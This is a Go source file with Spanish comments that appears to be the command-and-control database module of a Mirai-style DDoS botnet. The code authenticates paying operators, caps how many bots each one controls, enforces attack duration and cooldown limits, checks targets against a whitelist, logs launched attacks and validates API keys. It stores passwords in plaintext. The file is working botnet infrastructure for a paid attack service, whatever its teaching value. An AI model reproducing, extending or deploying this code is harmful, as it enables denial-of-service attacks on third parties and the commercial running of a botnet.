/**
 * @file database.go
 * @brief Implementación del acceso a base de datos MySQL para el servidor CNC
 *
 * Este archivo contiene la lógica para:
 * - Autenticación y gestión de usuarios
 * - Control de límites y permisos de ataque
 * - Validación de objetivos contra lista blanca
 * - Registro histórico de ataques
 * - Verificación de claves API
 */

package main

import (
	"database/sql"    // Interfaz de base de datos SQL
	"encoding/binary" // Conversión entre bytes y tipos numéricos
	"errors"          // Creación de errores personalizados
	"fmt"             // Formateo y logging
	"net"             // Manejo de direcciones IP
	"time"            // Manejo de tiempo y timestamps

	_ "github.com/go-sql-driver/mysql" // Driver MySQL
)

/**
 * Database encapsula la conexión y operaciones con la base de datos MySQL
 *
 * Esta estructura proporciona una interfaz para todas las operaciones
 * relacionadas con la persistencia de datos del servidor CNC.
 */
type Database struct {
	db *sql.DB // Conexión a la base de datos MySQL
}

/**
 * AccountInfo almacena la información básica de una cuenta de usuario
 *
 * Esta estructura se usa para transferir información de cuenta entre
 * la base de datos y el sistema de autenticación.
 */
type AccountInfo struct {
	username string // Nombre de usuario
	maxBots  int    // Número máximo de bots que puede controlar
	admin    int    // Nivel de privilegios (0=normal, 1=admin)
}

/**
 * NewDatabase crea una nueva conexión a la base de datos MySQL
 *
 * @param dbAddr     Dirección del servidor MySQL (host:puerto)
 * @param dbUser     Usuario de la base de datos
 * @param dbPassword Contraseña de la base de datos
 * @param dbName     Nombre de la base de datos a usar
 * @return           Puntero a la nueva instancia de Database
 */
func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
	// Conectamos a la base de datos MySQL usando el driver
	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("Mysql DB opened")
	return &Database{db}
}

/**
 * TryLogin intenta autenticar un usuario con sus credenciales
 *
 * Esta función verifica:
 * - Que el usuario y contraseña coincidan
 * - Que la cuenta esté activa (wrc=0) o al día en pagos
 *
 * @param username Nombre de usuario
 * @param password Contraseña del usuario
 * @return (éxito, info) true si login exitoso, junto con la info de cuenta
 */
func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
	// Consultamos la información de cuenta verificando credenciales y estado
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()

	// Si no hay resultados, credenciales inválidas
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}

	// Escaneamos la información de la cuenta
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}

/**
 * CreateUser crea una nueva cuenta de usuario en la base de datos
 *
 * @param username  Nombre de usuario deseado
 * @param password  Contraseña para la cuenta
 * @param max_bots  Número máximo de bots permitidos
 * @param duration  Límite de duración máxima de ataques (segundos)
 * @param cooldown  Tiempo de espera entre ataques (segundos)
 * @return          true si la cuenta fue creada, false si ya existe o hay error
 */
func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
	// Verificamos si el usuario ya existe
	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false
	}
	if rows.Next() {
		return false // Usuario ya existe
	}

	// Creamos el nuevo usuario
	this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)",
		username, password, max_bots, cooldown, duration)
	return true
}

/**
 * ContainsWhitelistedTargets verifica si algún objetivo del ataque está en la lista blanca
 *
 * Esta función compara cada objetivo del ataque con las redes en lista blanca,
 * considerando los diferentes casos de coincidencia de máscaras de red:
 * - Lista blanca más general que objetivo
 * - Objetivo más general que lista blanca
 * - Ambos con la misma especificidad
 *
 * @param attack Ataque a validar contra la lista blanca
 * @return       true si algún objetivo está en lista blanca
 */
func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	// Obtenemos todas las redes en lista blanca
	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer rows.Close()

	// Revisamos cada red en lista blanca
	for rows.Next() {
		var prefix string
		var netmask uint8
		rows.Scan(&prefix, &netmask)

		// Convertimos el prefijo de lista blanca a uint32
		ip := net.ParseIP(prefix)
		ip = ip[12:] // Tomamos solo los últimos 4 bytes (IPv4)
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)

		// Comparamos con cada objetivo del ataque
		for aPNetworkOrder, aN := range attack.Targets {
			// Convertimos el objetivo a formato comparable
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)

			// Caso 1: Lista blanca más general que objetivo
			if aN > netmask {
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
				// Caso 2: Objetivo más general que lista blanca
			} else if aN < netmask {
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
				// Caso 3: Misma especificidad
			} else {
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

/**
 * CanLaunchAttack verifica si un usuario puede lanzar un ataque
 *
 * Esta función valida:
 * - Que el usuario exista y tenga acceso
 * - Que la duración no exceda el límite del usuario
 * - Que se respete el tiempo de espera entre ataques
 *
 * @param username        Nombre del usuario
 * @param duration        Duración del ataque en segundos
 * @param fullCommand    Comando completo del ataque
 * @param maxBots        Número máximo de bots a usar
 * @param allowConcurrent Si permite ataques simultáneos
 * @return (permitido, error) true si se permite, con error descriptivo si no
 */
func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	// Obtenemos información del usuario
	rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
	defer rows.Close()
	if err != nil {
		fmt.Println(err)
	}

	// Verificamos que el usuario existe y tiene acceso
	var userId, durationLimit, cooldown uint32
	if !rows.Next() {
		return false, errors.New("Your access has been terminated")
	}
	rows.Scan(&userId, &durationLimit, &cooldown)

	// Verificamos límite de duración
	if durationLimit != 0 && duration > durationLimit {
		return false, errors.New(fmt.Sprintf("You may not send attacks longer than %d seconds.", durationLimit))
	}
	rows.Close()

	// Si no se permiten ataques simultáneos, verificamos cooldown
	if allowConcurrent == 0 {
		rows, err = this.db.Query("SELECT time_sent, duration FROM history WHERE user_id = ? AND (time_sent + duration + ?) > UNIX_TIMESTAMP()", userId, cooldown)
		if err != nil {
			fmt.Println(err)
		}
		if rows.Next() {
			var timeSent, historyDuration uint32
			rows.Scan(&timeSent, &historyDuration)
			return false, errors.New(fmt.Sprintf("Please wait %d seconds before sending another attack", (timeSent+historyDuration+cooldown)-uint32(time.Now().Unix())))
		}
	}

	// Registramos el ataque en el historial
	this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)",
		userId, duration, fullCommand, maxBots)
	return true, nil
}

/**
 * CheckApiCode verifica una clave API y retorna la información de cuenta asociada
 *
 * Esta función se usa para autenticar solicitudes a la API del CNC,
 * permitiendo acceso programático al sistema.
 *
 * @param apikey Clave API a validar
 * @return (válida, info) true si la clave es válida, junto con info de cuenta
 */
func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	// Buscamos cuenta asociada a la clave API
	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
	if err != nil {
		fmt.Println(err)
		return false, AccountInfo{"", 0, 0}
	}
	defer rows.Close()

	// Verificamos si la clave existe
	if !rows.Next() {
		return false, AccountInfo{"", 0, 0}
	}

	// Obtenemos información de la cuenta
	var accInfo AccountInfo
	rows.Scan(&accInfo.username, &accInfo.maxBots, &accInfo.admin)
	return true, accInfo
}
